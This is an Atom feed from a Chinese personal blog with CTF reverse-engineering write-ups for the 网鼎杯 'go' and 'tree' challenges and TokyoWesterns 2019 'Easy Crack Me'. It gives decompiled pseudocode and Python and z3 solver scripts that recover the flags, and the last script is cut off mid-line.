<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>bufsnake</title>
  
  <subtitle>香香张</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://bufsnake.github.io/"/>
  <updated>2020-05-18T07:11:43.128Z</updated>
  <id>https://bufsnake.github.io/</id>
  
  <author>
    <name>bufsnake</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>TODO...</title>
    <link href="https://bufsnake.github.io/TODO.html"/>
    <id>https://bufsnake.github.io/TODO.html</id>
    <published>9999-09-09T01:09:09.000Z</published>
    <updated>2020-05-18T07:11:43.128Z</updated>
    
    <content type="html"><![CDATA[<h3 id="This-is-my-TODO…"><a href="#This-is-my-TODO…" class="headerlink" title="This is my TODO…"></a>This is my TODO…</h3><p><code>时间管理</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;This-is-my-TODO…&quot;&gt;&lt;a href=&quot;#This-is-my-TODO…&quot; class=&quot;headerlink&quot; title=&quot;This is my TODO…&quot;&gt;&lt;/a&gt;This is my TODO…&lt;/h3&gt;&lt;p&gt;&lt;code&gt;时间管理&lt;/co
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>网鼎杯 朱雀组 逆向 WP</title>
    <link href="https://bufsnake.github.io/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E6%9C%B1%E9%9B%80%E7%BB%84-%E9%80%86%E5%90%91-WP.html"/>
    <id>https://bufsnake.github.io/网鼎杯-朱雀组-逆向-WP.html</id>
    <published>2020-05-18T07:05:01.000Z</published>
    <updated>2020-05-16T14:23:07.758Z</updated>
    
    <content type="html"><![CDATA[<h2 id="go"><a href="#go" class="headerlink" title="go"></a>go</h2><p>程序主要作用就是输入正确的内容，然后经过base64加密，与硬编码的字符串进行比较，如果正确则输出flag。</p><p>动态调试，可以得到base64码表</p><p><img src="/images/pasted-258.png" srcset="/img/loading.gif" alt="upload successful"></p><p>替换码表解密脚本如下</p><pre><code class="python">import stringimport base64my_base64table = &quot;XYZFGHI2+/Jhi345jklmEnopuvwqrABCDKL6789abMNWcdefgstOPQRSTUVxyz01&quot;std_base64table =&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;s = &quot;nRKKAHzMrQzaqQzKpPHClX==&quot;s = s.translate(string.maketrans(my_base64table,std_base64table))print base64.b64decode(s)# What_is_go_a_A_H</code></pre><p>可以直接输入获取flag</p><p><img src="/images/pasted-259.png" srcset="/img/loading.gif" alt="upload successful"></p><h2 id="tree"><a href="#tree" class="headerlink" title="tree"></a>tree</h2><p>这题主要逻辑就是输入<code>flag{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}</code>格式的flag，然后第一个函数会对为x的位置的字符进行判断，然后将字符转换为二进制表示，然后调用第二个函数，主要是通过判断上个函数得到的二进制字符串，为0则加12，为1则加16，然后通过系统自动生成的数组得到最终加密的字符，solver代码如下：</p><p>关键需要模拟数组的起始地址，用字典表示</p><pre><code class="python">flag = [   0x00000000, 0x00000001, 0x00000062, 0x00000013, 0x00000001, 0x00000000, 0x00000000, 0x00000001,   0x00000063, 0x0000001B, 0x00000002, 0x00000000, 0x00000000, 0x00000001, 0x00000064, 0x00000006,   0x00000003, 0x00000000, 0x00000000, 0x00000001, 0x00000065, 0x0000000F, 0x00000004, 0x00000000,   0x00000000, 0x00000001, 0x00000066, 0x0000002F, 0x00000005, 0x00000000, 0x00000000, 0x00000001,   0x00000067, 0x0000002A, 0x00000006, 0x00000000, 0x00000000, 0x00000001, 0x00000068, 0x0000003A,   0x00000007, 0x00000000, 0x00000000, 0x00000001, 0x00000069, 0x00000006, 0x00000008, 0x00000000,   0x00000000, 0x00000001, 0x0000006A, 0x0000005F, 0x00000009, 0x00000000, 0x00000000, 0x00000001,   0x0000006B, 0x00000019, 0x0000000A, 0x00000000, 0x00000000, 0x00000001, 0x0000006C, 0x00000007,   0x0000000B, 0x00000000, 0x00000000, 0x00000001, 0x0000006D, 0x00000012, 0x0000000C, 0x00000000,   0x00000000, 0x00000001, 0x0000006E, 0x00000037, 0x0000000D, 0x00000000, 0x00000000, 0x00000001,   0x0000006F, 0x0000001E, 0x0000000E, 0x00000000, 0x00000000, 0x00000001, 0x00000070, 0x00000018,   0x0000000F, 0x00000000, 0x00000000, 0x00000001, 0x00000071, 0x00000016, 0x00000010, 0x00000000,   0x00000000, 0x00000001, 0x00000072, 0x00000002, 0x00000011, 0x00000000, 0x00000000, 0x00000001,   0x00000073, 0x00000069, 0x00000012, 0x00000000, 0x00000000, 0x00000001, 0x00000074, 0x0000000D,   0x00000013, 0x00000000, 0x00000000, 0x00000001, 0x00000075, 0x00000004, 0x00000014, 0x00000000,   0x00000000, 0x00000001, 0x00000076, 0x0000004B, 0x00000015, 0x00000000, 0x00000000, 0x00000001,   0x00000077, 0x00000017, 0x00000016, 0x00000000, 0x00000000, 0x00000001, 0x00000078, 0x0000000C,   0x00000017, 0x00000000, 0x00000000, 0x00000001, 0x00000079, 0x00000026, 0x00000018, 0x00000000,   0x00000000, 0x00000001, 0x0000007A, 0x00000033, 0x00000019, 0x00000000, 0x00000000, 0x00000001,   0x00000000, 0x00000005, 0x0000001A, 0x00406218, 0x00406080, 0x00000001, 0x00000000, 0x00000009,   0x0000001B, 0x00406260, 0x004062F0, 0x00000001, 0x00000000, 0x0000000C, 0x0000001C, 0x004060C8,   0x00406140, 0x00000001, 0x00000000, 0x00000010, 0x0000001D, 0x00406188, 0x00406308, 0x00000001,   0x00000000, 0x00000018, 0x0000001E, 0x004062A8, 0x00406320, 0x00000001, 0x00000000, 0x0000001C,   0x0000001F, 0x00406248, 0x004060E0, 0x00000001, 0x00000000, 0x00000022, 0x00000020, 0x00406338,   0x004061A0, 0x00000001, 0x00000000, 0x00000029, 0x00000021, 0x00406098, 0x00406200, 0x00000001,   0x00000000, 0x0000002F, 0x00000022, 0x00406290, 0x004061E8, 0x00000001, 0x00000000, 0x00000031,   0x00000023, 0x00406350, 0x00406170, 0x00000001, 0x00000000, 0x00000037, 0x00000024, 0x004060B0,   0x00406368, 0x00000001, 0x00000000, 0x00000040, 0x00000025, 0x004061D0, 0x00406380, 0x00000001,   0x00000000, 0x0000004F, 0x00000026, 0x004062C0, 0x00406398, 0x00000001, 0x00000000, 0x00000059,   0x00000027, 0x00406110, 0x004060F8, 0x00000001, 0x00000000, 0x00000060, 0x00000028, 0x004063B0,   0x004063C8, 0x00000001, 0x00000000, 0x0000006A, 0x00000029, 0x004062D8, 0x004061B8, 0x00000001,   0x00000000, 0x00000071, 0x0000002A, 0x004063E0, 0x00406128, 0x00000001, 0x00000000, 0x0000008B,   0x0000002B, 0x004063F8, 0x00406278, 0x00000001, 0x00000000, 0x000000A8, 0x0000002C, 0x00406410,   0x00406428, 0x00000001, 0x00000000, 0x000000BF, 0x0000002D, 0x00406158, 0x00406440, 0x00000001,   0x00000000, 0x000000D3, 0x0000002E, 0x00406230, 0x00406458, 0x00000001, 0x00000000, 0x000000FC,   0x0000002F, 0x00406470, 0x00406488, 0x00000001, 0x00000000, 0x00000167, 0x00000030, 0x004064A0,   0x004064B8, 0x00000001, 0x00000000, 0x000001CF, 0x00000031, 0x004064D0, 0x004064E8, 0x00000001,   0x00000000, 0x00000336, 0x00000032, 0x00406500, 0x00406518   ]#offset = 0x00406090#for i in range(0,len(flag)):#    print hex(offset + i * 4)+&quot;:&quot;+hex(flag[i])+&#39;,&#39;,flag = {0x406090:0x0, 0x406094:0x1, 0x406098:0x62, 0x40609c:0x13, 0x4060a0:0x1, 0x4060a4:0x0, 0x4060a8:0x0, 0x4060ac:0x1, 0x4060b0:0x63, 0x4060b4:0x1b, 0x4060b8:0x2, 0x4060bc:0x0, 0x4060c0:0x0, 0x4060c4:0x1, 0x4060c8:0x64, 0x4060cc:0x6, 0x4060d0:0x3, 0x4060d4:0x0, 0x4060d8:0x0, 0x4060dc:0x1, 0x4060e0:0x65, 0x4060e4:0xf, 0x4060e8:0x4, 0x4060ec:0x0, 0x4060f0:0x0, 0x4060f4:0x1, 0x4060f8:0x66, 0x4060fc:0x2f, 0x406100:0x5, 0x406104:0x0, 0x406108:0x0, 0x40610c:0x1, 0x406110:0x67, 0x406114:0x2a, 0x406118:0x6, 0x40611c:0x0, 0x406120:0x0, 0x406124:0x1, 0x406128:0x68, 0x40612c:0x3a, 0x406130:0x7, 0x406134:0x0, 0x406138:0x0, 0x40613c:0x1, 0x406140:0x69, 0x406144:0x6, 0x406148:0x8, 0x40614c:0x0, 0x406150:0x0, 0x406154:0x1, 0x406158:0x6a, 0x40615c:0x5f, 0x406160:0x9, 0x406164:0x0, 0x406168:0x0, 0x40616c:0x1, 0x406170:0x6b, 0x406174:0x19, 0x406178:0xa, 0x40617c:0x0, 0x406180:0x0, 0x406184:0x1, 0x406188:0x6c, 0x40618c:0x7, 0x406190:0xb, 0x406194:0x0, 0x406198:0x0, 0x40619c:0x1, 0x4061a0:0x6d, 0x4061a4:0x12, 0x4061a8:0xc, 0x4061ac:0x0, 0x4061b0:0x0, 0x4061b4:0x1, 0x4061b8:0x6e, 0x4061bc:0x37, 0x4061c0:0xd, 0x4061c4:0x0, 0x4061c8:0x0, 0x4061cc:0x1, 0x4061d0:0x6f, 0x4061d4:0x1e, 0x4061d8:0xe, 0x4061dc:0x0, 0x4061e0:0x0, 0x4061e4:0x1, 0x4061e8:0x70, 0x4061ec:0x18, 0x4061f0:0xf, 0x4061f4:0x0, 0x4061f8:0x0, 0x4061fc:0x1, 0x406200:0x71, 0x406204:0x16, 0x406208:0x10, 0x40620c:0x0, 0x406210:0x0, 0x406214:0x1, 0x406218:0x72, 0x40621c:0x2, 0x406220:0x11, 0x406224:0x0, 0x406228:0x0, 0x40622c:0x1, 0x406230:0x73, 0x406234:0x69, 0x406238:0x12, 0x40623c:0x0, 0x406240:0x0, 0x406244:0x1, 0x406248:0x74, 0x40624c:0xd, 0x406250:0x13, 0x406254:0x0, 0x406258:0x0, 0x40625c:0x1, 0x406260:0x75, 0x406264:0x4, 0x406268:0x14, 0x40626c:0x0, 0x406270:0x0, 0x406274:0x1, 0x406278:0x76, 0x40627c:0x4b, 0x406280:0x15, 0x406284:0x0, 0x406288:0x0, 0x40628c:0x1, 0x406290:0x77, 0x406294:0x17, 0x406298:0x16, 0x40629c:0x0, 0x4062a0:0x0, 0x4062a4:0x1, 0x4062a8:0x78, 0x4062ac:0xc, 0x4062b0:0x17, 0x4062b4:0x0, 0x4062b8:0x0, 0x4062bc:0x1, 0x4062c0:0x79, 0x4062c4:0x26, 0x4062c8:0x18, 0x4062cc:0x0, 0x4062d0:0x0, 0x4062d4:0x1, 0x4062d8:0x7a, 0x4062dc:0x33, 0x4062e0:0x19, 0x4062e4:0x0, 0x4062e8:0x0, 0x4062ec:0x1, 0x4062f0:0x0, 0x4062f4:0x5, 0x4062f8:0x1a, 0x4062fc:0x406218, 0x406300:0x406080, 0x406304:0x1, 0x406308:0x0, 0x40630c:0x9, 0x406310:0x1b, 0x406314:0x406260, 0x406318:0x4062f0, 0x40631c:0x1, 0x406320:0x0, 0x406324:0xc, 0x406328:0x1c, 0x40632c:0x4060c8, 0x406330:0x406140, 0x406334:0x1, 0x406338:0x0, 0x40633c:0x10, 0x406340:0x1d, 0x406344:0x406188, 0x406348:0x406308, 0x40634c:0x1, 0x406350:0x0, 0x406354:0x18, 0x406358:0x1e, 0x40635c:0x4062a8, 0x406360:0x406320, 0x406364:0x1, 0x406368:0x0, 0x40636c:0x1c, 0x406370:0x1f, 0x406374:0x406248, 0x406378:0x4060e0, 0x40637c:0x1, 0x406380:0x0, 0x406384:0x22, 0x406388:0x20, 0x40638c:0x406338, 0x406390:0x4061a0, 0x406394:0x1, 0x406398:0x0, 0x40639c:0x29, 0x4063a0:0x21, 0x4063a4:0x406098, 0x4063a8:0x406200, 0x4063ac:0x1, 0x4063b0:0x0, 0x4063b4:0x2f, 0x4063b8:0x22, 0x4063bc:0x406290, 0x4063c0:0x4061e8, 0x4063c4:0x1, 0x4063c8:0x0, 0x4063cc:0x31, 0x4063d0:0x23, 0x4063d4:0x406350, 0x4063d8:0x406170, 0x4063dc:0x1, 0x4063e0:0x0, 0x4063e4:0x37, 0x4063e8:0x24, 0x4063ec:0x4060b0, 0x4063f0:0x406368, 0x4063f4:0x1, 0x4063f8:0x0, 0x4063fc:0x40, 0x406400:0x25, 0x406404:0x4061d0, 0x406408:0x406380, 0x40640c:0x1, 0x406410:0x0, 0x406414:0x4f, 0x406418:0x26, 0x40641c:0x4062c0, 0x406420:0x406398, 0x406424:0x1, 0x406428:0x0, 0x40642c:0x59, 0x406430:0x27, 0x406434:0x406110, 0x406438:0x4060f8, 0x40643c:0x1, 0x406440:0x0, 0x406444:0x60, 0x406448:0x28, 0x40644c:0x4063b0, 0x406450:0x4063c8, 0x406454:0x1, 0x406458:0x0, 0x40645c:0x6a, 0x406460:0x29, 0x406464:0x4062d8, 0x406468:0x4061b8, 0x40646c:0x1, 0x406470:0x0, 0x406474:0x71, 0x406478:0x2a, 0x40647c:0x4063e0, 0x406480:0x406128, 0x406484:0x1, 0x406488:0x0, 0x40648c:0x8b, 0x406490:0x2b, 0x406494:0x4063f8, 0x406498:0x406278, 0x40649c:0x1, 0x4064a0:0x0, 0x4064a4:0xa8, 0x4064a8:0x2c, 0x4064ac:0x406410, 0x4064b0:0x406428, 0x4064b4:0x1, 0x4064b8:0x0, 0x4064bc:0xbf, 0x4064c0:0x2d, 0x4064c4:0x406158, 0x4064c8:0x406440, 0x4064cc:0x1, 0x4064d0:0x0, 0x4064d4:0xd3, 0x4064d8:0x2e, 0x4064dc:0x406230, 0x4064e0:0x406458, 0x4064e4:0x1, 0x4064e8:0x0, 0x4064ec:0xfc, 0x4064f0:0x2f, 0x4064f4:0x406470, 0x4064f8:0x406488, 0x4064fc:0x1, 0x406500:0x0, 0x406504:0x167, 0x406508:0x30, 0x40650c:0x4064a0, 0x406510:0x4064b8, 0x406514:0x1, 0x406518:0x0, 0x40651c:0x1cf, 0x406520:0x31, 0x406524:0x4064d0, 0x406528:0x4064e8, 0x40652c:0x1, 0x406530:0x0, 0x406534:0x336, 0x406538:0x32, 0x40653c:0x406500, 0x406540:0x406518}offset = 0x406530cmpstr = &#39;zvzjyvosgnzkbjjjypjbjdvmsjjyvsjx&#39;print cmpstrprint len(cmpstr)for i in range(0,len(cmpstr)):    for j in [12,16]:        try:            if flag[flag[offset+j]] == ord(cmpstr[i]):                print j,                break        except:            pass        for k in [12,16]:            try:                if flag[flag[flag[offset+j]+k]] == ord(cmpstr[i]):                    print j,k,                    break            except:                pass            for l in [12,16]:                try:                    if flag[flag[flag[flag[offset+j]+k]+l]] == ord(cmpstr[i]):                        print j,k,l,                        break                except:                    pass                for m in [12,16]:                    try:                        if flag[flag[flag[flag[flag[offset+j]+k]+l]+m]] == ord(cmpstr[i]):                            print j,k,l,m,                            break                    except:                        pass                    for n in [12,16]:                        try:                            if flag[flag[flag[flag[flag[flag[offset+j]+k]+l]+m]+n]] == ord(cmpstr[i]):                                print j,k,l,m,n,                                break                        except:                            pass                        for s in [12,16]:                            try:                                if flag[flag[flag[flag[flag[flag[flag[offset+j]+k]+l]+m]+n]+s]] == ord(cmpstr[i]):                                    print j,k,l,m,n,s,                                    break                            except:                                pass                            for buf in [12,16]:                                try:                                    if flag[flag[flag[flag[flag[flag[flag[flag[offset+j]+k]+l]+m]+n]+s]+buf]] == ord(cmpstr[i]):                                        print j,k,l,m,n,s,buf,                                        break                                except:                                    passopcode = [16,12,16,12,16,16,16,16,16,12,16,12,12,16,12,12,12,12,12,16,16,16,16,16,16,16,12,12,16,12,12,12,12,16,12,16,12,16,16,16,12,16,12,12,16,16,16,16,12,12,12,16,12,12,16,12,12,16,12,12,16,12,12,12,12,12,12,16,16,12,16,12,16,12,12,12,12,16,12,12,16,12,12,16,16,16,12,16,12,16,16,16,16,16,16,16,12,16,16,16,12,12,12,16,12,12,16,12,12,12,12,12,16,16,16,16,16,12,12,12,16,12,12,16,16,16,12,12]flag = []for i in range(0,len(opcode),4):    aaaa = &#39;&#39;    for j in range(0,4):        if opcode[i+j] == 16:            aaaa += &#39;1&#39;        elif opcode[i+j] == 12:            aaaa += &#39;0&#39;    flag.append(aaaa)print &#39;&#39;for i in flag:    print hex(int(i,2))[2:],# 得到的结果带入到flag{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}# flag{afa41fc8-574f-1248-1a84-9d7f7120f89c}</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;go&quot;&gt;&lt;a href=&quot;#go&quot; class=&quot;headerlink&quot; title=&quot;go&quot;&gt;&lt;/a&gt;go&lt;/h2&gt;&lt;p&gt;程序主要作用就是输入正确的内容，然后经过base64加密，与硬编码的字符串进行比较，如果正确则输出flag。&lt;/p&gt;
&lt;p&gt;动态调试，可以得
      
    
    </summary>
    
      <category term="ctf" scheme="https://bufsnake.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://bufsnake.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>TokyoWesterns CTF 2019 Easy Crack Me</title>
    <link href="https://bufsnake.github.io/TokyoWesterns-CTF-2019-Easy-Crack-Me.html"/>
    <id>https://bufsnake.github.io/TokyoWesterns-CTF-2019-Easy-Crack-Me.html</id>
    <published>2020-05-04T21:32:36.000Z</published>
    <updated>2020-05-04T21:41:22.435Z</updated>
    
    <content type="html"><![CDATA[<h2 id="伪代码分析"><a href="#伪代码分析" class="headerlink" title="伪代码分析"></a>伪代码分析</h2><pre><code class="c">signed __int64 __fastcall main(int a1, char **a2, char **a3){  signed __int64 result; // rax  char *j; // rax  char v5; // ST1F_1  char v6; // ST1E_1  char v7; // [rsp+1Dh] [rbp-1B3h]  signed int i; // [rsp+20h] [rbp-1B0h]  signed int k; // [rsp+24h] [rbp-1ACh]  int v10; // [rsp+28h] [rbp-1A8h]  int v11; // [rsp+2Ch] [rbp-1A4h]  signed int l; // [rsp+30h] [rbp-1A0h]  signed int m; // [rsp+34h] [rbp-19Ch]  int v14; // [rsp+38h] [rbp-198h]  int v15; // [rsp+3Ch] [rbp-194h]  signed int n; // [rsp+40h] [rbp-190h]  signed int ii; // [rsp+44h] [rbp-18Ch]  int v18; // [rsp+48h] [rbp-188h]  signed int jj; // [rsp+4Ch] [rbp-184h]  char *s; // [rsp+58h] [rbp-178h]  __int64 v21; // [rsp+70h] [rbp-160h]  __int64 v22; // [rsp+78h] [rbp-158h]  __int64 v23; // [rsp+80h] [rbp-150h]  __int64 v24; // [rsp+88h] [rbp-148h]  __int64 v25; // [rsp+90h] [rbp-140h]  __int64 v26; // [rsp+98h] [rbp-138h]  __int64 v27; // [rsp+A0h] [rbp-130h]  __int64 v28; // [rsp+A8h] [rbp-128h]  __int64 v29; // [rsp+B0h] [rbp-120h]  __int64 v30; // [rsp+B8h] [rbp-118h]  __int64 v31; // [rsp+C0h] [rbp-110h]  __int64 v32; // [rsp+C8h] [rbp-108h]  __int64 v33; // [rsp+D0h] [rbp-100h]  __int64 v34; // [rsp+D8h] [rbp-F8h]  __int64 v35; // [rsp+E0h] [rbp-F0h]  __int64 v36; // [rsp+E8h] [rbp-E8h]  __int64 s1; // [rsp+F0h] [rbp-E0h]  __int64 v38; // [rsp+F8h] [rbp-D8h]  __int64 v39; // [rsp+100h] [rbp-D0h]  __int64 v40; // [rsp+108h] [rbp-C8h]  __int64 v41; // [rsp+110h] [rbp-C0h]  __int64 v42; // [rsp+118h] [rbp-B8h]  __int64 v43; // [rsp+120h] [rbp-B0h]  __int64 v44; // [rsp+128h] [rbp-A8h]  int v45[32]; // [rsp+130h] [rbp-A0h]  __int64 v46; // [rsp+1B0h] [rbp-20h]  __int64 v47; // [rsp+1B8h] [rbp-18h]  unsigned __int64 v48; // [rsp+1C8h] [rbp-8h]  v48 = __readfsqword(0x28u);  if ( a1 == 2 )  {    s = a2[1];    if ( strlen(a2[1]) != 39 )    {      puts(&quot;incorrect&quot;);      exit(0);    }    if ( memcmp(s, &quot;TWCTF{&quot;, 6uLL) || s[38] != &#39;}&#39; )    {      puts(&quot;incorrect&quot;);      exit(0);    }    s1 = 0LL;    v38 = 0LL;    v39 = 0LL;    v40 = 0LL;    v41 = 0LL;    v42 = 0LL;    v43 = 0LL;    v44 = 0LL;    v46 = &#39;76543210&#39;;    v47 = &#39;fedcba98&#39;;                           // 判断字符出现的次数    for ( i = 0; i &lt;= 15; ++i )    {      for ( j = strchr(s, *(&amp;v46 + i)); j; j = strchr(j + 1, *(&amp;v46 + i)) )        ++*(&amp;s1 + i);    }    if ( memcmp(&amp;s1, &amp;dword_400F00, 0x40uLL) )    {      puts(&quot;incorrect&quot;);      exit(0);    }    v21 = 0LL;    v22 = 0LL;    v23 = 0LL;    v24 = 0LL;    v25 = 0LL;    v26 = 0LL;    v27 = 0LL;    v28 = 0LL;    for ( k = 0; k &lt;= 7; ++k )                  // 操作中间的32位 每4位一组    {      v10 = 0;      v11 = 0;      for ( l = 0; l &lt;= 3; ++l )      {        v5 = s[4 * k + 6 + l];        v10 += v5;        v11 ^= v5;      }      *(&amp;v21 + k) = v10;      *(&amp;v25 + k) = v11;    }    v29 = 0LL;    v30 = 0LL;    v31 = 0LL;    v32 = 0LL;    v33 = 0LL;    v34 = 0LL;    v35 = 0LL;    v36 = 0LL;    for ( m = 0; m &lt;= 7; ++m )    {      v14 = 0;      v15 = 0;      for ( n = 0; n &lt;= 3; ++n )      {        v6 = s[8 * n + 6 + m];                  // 6 14 22 30        v14 += v6;                              // 7 15 23 31        v15 ^= v6;                              // 8 16 24 32      }      *(&amp;v29 + m) = v14;      *(&amp;v33 + m) = v15;    }    if ( memcmp(&amp;v21, &amp;dword_400F40, 0x20uLL) || memcmp(&amp;v25, &amp;dword_400F60, 0x20uLL) )// 对比    {      puts(&quot;incorrect&quot;);      exit(0);    }    if ( memcmp(&amp;v29, &amp;dword_400FA0, 0x20uLL) || memcmp(&amp;v33, &amp;unk_400F80, 0x20uLL) )// 对比    {      puts(&quot;incorrect&quot;);      exit(0);    }    memset(v45, 0, sizeof(v45));    for ( ii = 0; ii &lt;= 31; ++ii )              // 通过中间32位 产生v45    {      v7 = s[ii + 6];      if ( v7 &lt;= 47 || v7 &gt; 57 )      {        if ( v7 &lt;= &#39;`&#39; || v7 &gt; &#39;f&#39; )          v45[ii] = 0;        else          v45[ii] = 128;      }      else      {        v45[ii] = 255;      }    }    if ( memcmp(v45, &amp;unk_400FC0, 0x80uLL) )    {      puts(&quot;incorrect&quot;);      exit(0);    }    v18 = 0;    for ( jj = 0; jj &lt;= 15; ++jj )              // 6 8 10 12 14      v18 += s[2 * (jj + 3)];    if ( v18 != 1160 )    {      puts(&quot;incorrect&quot;);      exit(0);    }    if ( s[37] != &#39;5&#39; || s[7] != &#39;f&#39; || s[11] != &#39;8&#39; || s[12] != &#39;7&#39; || s[23] != &#39;2&#39; || s[31] != &#39;4&#39; )    {      puts(&quot;incorrect&quot;);      exit(0);    }    printf(&quot;Correct: %s\n&quot;, s, a2);    result = 0LL;  }  else  {    fwrite(&quot;./bin flag_is_here&quot;, 1uLL, 0x12uLL, stderr);    result = 1LL;  }  return result;}</code></pre><p>很明显可以使用z3求解器求解，但这里有个问题z3无法判断字符出现的次数，所以这里我使用z3进行暴力破解</p><p>暴力破解只存在一个的字符，如”a”，可以得到只有30位才能为”a”，以此类推，最大程度的限制求解器。</p><h2 id="爆破循环"><a href="#爆破循环" class="headerlink" title="爆破循环"></a>爆破循环</h2><pre><code class="python"># 爆破1位for i in range(0,32):    if i == 1 or i == 5 or i == 6 or i == 17 or i == 25 or i == 31 or i == 13 or i == 30 or i == 2 or i == 7 or i == 9 or i == 19 or i == 28 or i == 18 or i == 21:        continue    sol(i,0)# 爆破2位for i in range(0,32):    if i == 1 or i == 5 or i == 6 or i == 17 or i == 25 or i == 31 or i == 13 or i == 30 or i == 2 or i == 7 or i == 9 or i == 19 or i == 28 or i == 18 or i == 21:        continue    if i == 4 or i == 29:        continue    for j in range(0,32):        if j == 1 or j == 5 or j == 6 or j == 17 or j == 25 or j == 31 or j == 13 or j == 30 or j == 2 or j == 7 or j == 9 or j == 19 or j == 28 or j == 18 or j == 21:            continue        if i == j:            continue        if j == 4 or j == 29:            continue        sol(i,j)</code></pre><h2 id="添加限制"><a href="#添加限制" class="headerlink" title="添加限制"></a>添加限制</h2><pre><code class="python"># 爆破 循环for i in range(0,len(s)):  if i == buf or i == buf1 or i == buf2:    solver.add(s[i] == ord(&#39;b&#39;))  else:    solver.add(s[i] != ord(&#39;b&#39;))</code></pre><h2 id="最终可以得到"><a href="#最终可以得到" class="headerlink" title="最终可以得到"></a>最终可以得到</h2><pre><code class="python"># 每个字符出现的次数##       0    1    2    3    4    5    6    7    8    9    a    b    c    d    e    f#num = [0x3, 0x2, 0x2, 0x0, 0x3, 0x2, 0x1, 0x3, 0x3, 0x1, 0x1, 0x3, 0x1, 0x2, 0x2, 0x3]solver.add(s[1] == ord(&#39;f&#39;))solver.add(s[5] == ord(&#39;8&#39;))solver.add(s[6] == ord(&#39;7&#39;))solver.add(s[17] == ord(&#39;2&#39;))solver.add(s[25] == ord(&#39;4&#39;))solver.add(s[31] == ord(&#39;5&#39;))# 爆破一位solver.add(s[13] == ord(&#39;9&#39;))for i in range(len(numorchar)):    if i != 13:        solver.add(s[i] != ord(&#39;9&#39;))solver.add(s[30] == ord(&#39;a&#39;))for i in range(len(numorchar)):    if i != 30:        solver.add(s[i] != ord(&#39;a&#39;))solver.add(s[2] == ord(&#39;2&#39;))for i in range(len(numorchar)):    if i != 2 and i != 17:        solver.add(s[i] != ord(&#39;2&#39;))# 爆破二位solver.add(s[7] == ord(&#39;7&#39;))solver.add(s[9] == ord(&#39;7&#39;))for i in range(len(numorchar)):    if i != 6 and i != 7 and i!=9:        solver.add(s[i] != ord(&#39;7&#39;))solver.add(s[19] == ord(&#39;8&#39;))solver.add(s[28] == ord(&#39;8&#39;))for i in range(len(numorchar)):    if i != 5 and i != 19 and i!=28:        solver.add(s[i] != ord(&#39;8&#39;))solver.add(s[18] == ord(&#39;f&#39;))solver.add(s[21] == ord(&#39;f&#39;))for i in range(len(numorchar)):    if i != 1 and i != 21 and i!=18:        solver.add(s[i] != ord(&#39;f&#39;))solver.add(s[4] == ord(&#39;4&#39;))solver.add(s[29] == ord(&#39;4&#39;))for i in range(len(numorchar)):    if i != 25 and i != 4 and i!=29:        solver.add(s[i] != ord(&#39;4&#39;))# 剩下的一位和二位都是多解# 6 在 22 27# c 在 11 15# 5 在 22 27# 1 在 10 14# 1 在 10 24# 1 在 10 27# 1 在 14 23# d 在 0 12# d 在 0 20# e 在 8 12# e 在 8 20# e 在 11 12# e 在 11 20# 0 在 10 16 24# 0 在 14 16 23# 0 在 16 23 24# 0 在 23 16 24# b 在 3 11 26# b 在 3 15 26</code></pre><h2 id="解密脚本"><a href="#解密脚本" class="headerlink" title="解密脚本"></a>解密脚本</h2><pre><code class="python"># -*- coding:utf8 -*-# 使用z3约束求解import z3import sysimport timestart = time.time()# 假设中间32位为 ss = [&#39;0&#39; for i in range(0,32)]nums = &#39;0123456789abcdef&#39;# 每个字符出现的次数#       0    1    2    3    4    5    6    7    8    9    a    b    c    d    e    fnum = [0x3, 0x2, 0x2, 0x0, 0x3, 0x2, 0x1, 0x3, 0x3, 0x1, 0x1, 0x3, 0x1, 0x2, 0x2, 0x3]counts = 0for i in range(0,len(num)):    counts += ord(nums[i]) * num[i]# 每四位一组相加结果addfour = [0x15E, 0xDA, 0x12F, 0x131, 0x100, 0x131, 0xFB, 0x102]# 每四位一组xor结果xorfour = [0x52, 0xC, 0x1, 0xF, 0x5C, 0x5, 0x53, 0x58]# 每隔八位相加结果add = [0x129, 0x103, 0x12B, 0x131, 0x135, 0x10B, 0x0FF, 0x0FF]# 每隔八位xor结果xor = [0x1, 0x57, 0x7, 0xD, 0xD, 0x53, 0x51, 0x51]# 为数字则为0xff 为字母则为128numorchar = [0x80, 0x80, 0xFF, 0x80, 0xFF, 0xFF, 0xFF, 0xFF, 0x80, 0xFF, 0xFF, 0x80, 0x80, 0xFF, 0xFF, 0x80,0xFF, 0xFF, 0x80, 0xFF, 0x80, 0x80, 0xFF, 0xFF,0xFF, 0xFF, 0x80, 0xFF, 0xFF, 0xFF, 0x80, 0xFF]# 每隔两位相加结果为1160result = 1160# s[37] != &#39;5&#39; || s[7] != &#39;f&#39; || s[11] != &#39;8&#39; || s[12] != &#39;7&#39; || s[23] != &#39;2&#39; || s[31] != &#39;4&#39;solver = z3.Solver()for i in range(0,len(s)):    s[i] = z3.BitVec(&#39;s[%d]&#39;%i,8)for i in range(0,len(addfour)):    solver.add(s[i*4] + s[i*4+1] + s[i*4+2] + s[i*4+3] == addfour[i])    solver.add(s[i*4] ^ s[i*4+1] ^ s[i*4+2] ^ s[i*4+3] == xorfour[i])for i in range(0,len(add)):    solver.add(s[i] + s[i+8] + s[i+16] + s[i+24] == add[i])    solver.add(s[i] ^ s[i+8] ^ s[i+16] ^ s[i+24] == xor[i])solver.add(s[0] + s[2] + s[4] + s[6] + s[8] + s[10] + s[12] + s[14] + s[16] + s[18] + s[20] + s[22] + s[24] + s[26] + s[28] + s[30] == result)solver.add(s[1] + s[3] + s[5] + s[7] + s[9] + s[11] + s[13] + s[15] + s[17] + s[19] + s[21] + s[23] + s[25] + s[27] + s[29] + s[31] == counts-result)solver.add(s[0] + s[1] + s[2] + s[3] + s[4] + s[5] + s[6] + s[7] + s[8] + s[9] + s[10] + s[11] + 